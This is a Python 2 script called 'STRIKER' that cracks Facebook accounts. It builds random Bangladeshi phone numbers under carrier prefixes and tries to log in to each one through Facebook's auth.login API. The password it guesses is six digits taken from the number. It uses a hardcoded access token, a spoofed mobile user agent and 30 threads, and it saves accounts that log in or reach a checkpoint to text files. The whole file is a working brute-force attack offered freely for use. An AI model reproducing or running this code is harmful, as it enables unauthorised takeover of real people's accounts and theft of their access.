#Tools Created By ZIHAD HOSSAIN RAFI
#I AM SINGLE
#I LOVE ALLAH

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
os.system('clear')
print
 
print
 
print("""

\033[0;92m ____ _____ ____  ___ _  _______ ____  
 \033[0;92m/ ___|_   _|  _ \|_ _| |/ / ____|  _ \ 
 \033[0;92m\___ \ | | | |_) || || ' /|  _| | |_) |
  \033[0;92m___) || | |  _ < | || . \| |___|  _ < 
 \033[0;92m|____/ |_| |_| \_\___|_|\_\_____|_| \_\

""")

print("\033[0;94mThis Tool's Free By MR-ZIHAD")

psb('\x1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
for n in range(90000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
 
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
 
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 C')
 
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
def exb():
    print
    os.sys.exit()
 
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
def t():
    time.sleep(1)
 
 
def cb():
    os.system('clear')

logo = """
                                                                      
\033[0;92m ____ _____ ____  ___ _  _______ ____  
 \033[0;92m/ ___|_   _|  _ \|_ _| |/ / ____|  _ \ 
 \033[0;92m\___ \ | | | |_) || || ' /|  _| | |_) |
  \033[0;92m___) || | |  _ < | || . \| |___|  _ < 
 \033[0;92m|____/ |_| |_| \_\___|_|\_\_____|_| \_\
                                             
"""

back = 0
successful = []
cpb = []
oks = []
id = []
 
def menu():
    os.system('clear')
    print logo
    print ''
    print '\033[0;93mAUTHOR     : MR-ZIHAD'
    print '\033[0;94mFACEBOOK   : MD ZAHIDUL ISLAM'
    print '\033[0;96mGITHUB     : MR-ZIHAD'
    print ''
    print '\033[0;96mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '\033[0;91m'
    print 50* '-'
    print '\033[0;92m[1]  \x1b[1;93mGP'
    print '\033[0;95m[2]  \x1b[1;95mRobi'
    print '\033[0;94m[3]  \x1b[1;94mAirtel'
    print '\033[0;92m[4]  \x1b[1;92mBanglalink'
    print '\033[0;96m[5]  \x1b[1;96mTeletalk'
    print '\033[0;91m[0]  \x1b[1;91mExit            '
    print '\033[0;91m'
    print 50 * '-'
    action()
 
 
def action():
    global cpb
    global oks
    bch = raw_input('\033[0;92m\n> ')
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
        print''
        try:
            c = raw_input('\033[0;92mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '2':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
        print''
        try:
            c = raw_input('\033[0;92mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '3':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
        print''
        try:
            c = raw_input('\033[0;92mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '4':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
        print''
        try:
            c = raw_input('\033[0;92mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '5':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
        print''
        try:
            c = raw_input('\033[0;92mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '0':
        exb()
    else:
        print
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x96] Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50 * '-')
    time.sleep(0.5)
    print
    50 * '-'
    print
 
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
 
        try:
            result = k + c + user
            digi6 = result[8:14]
            pass1 = digi6
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Just Now]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[RAFI-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] OK File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 STRIKER.py')
 
 
if __name__ == '__main__':
    menu()
